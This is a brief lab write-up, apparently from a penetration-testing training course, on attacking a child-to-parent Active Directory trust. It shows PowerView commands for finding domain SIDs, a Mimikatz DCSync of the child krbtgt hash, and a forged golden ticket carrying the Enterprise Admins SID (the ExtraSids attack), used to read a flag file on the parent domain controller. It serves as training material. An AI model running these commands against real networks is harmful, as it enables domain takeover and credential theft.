# [Attacking Domain Trusts - Child -> Parent Trusts - from Windows](Attacking%20Domain%20Trusts%20-%20Child%20->%20Parent%20Trusts%20-%20from%20Windows.md)

### What is the SID of the child domain?

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
```
![](Screenshot%202026-06-01%20at%2013.48.33.png)
### What is the SID of the Enterprise Admins group in the root domain?

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
![](Screenshot%202026-06-01%20at%2013.49.18.png)
### Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.

```powershell
.\mimikatz.exe
lsadump::dcsync /user:LOGISTICS\krbtgt
```
![](Pasted%20image%2020260601135733.png)

```powershell
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
![](Pasted%20image%2020260601135747.png)

```powershell
cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```
![](Pasted%20image%2020260601135756.png)
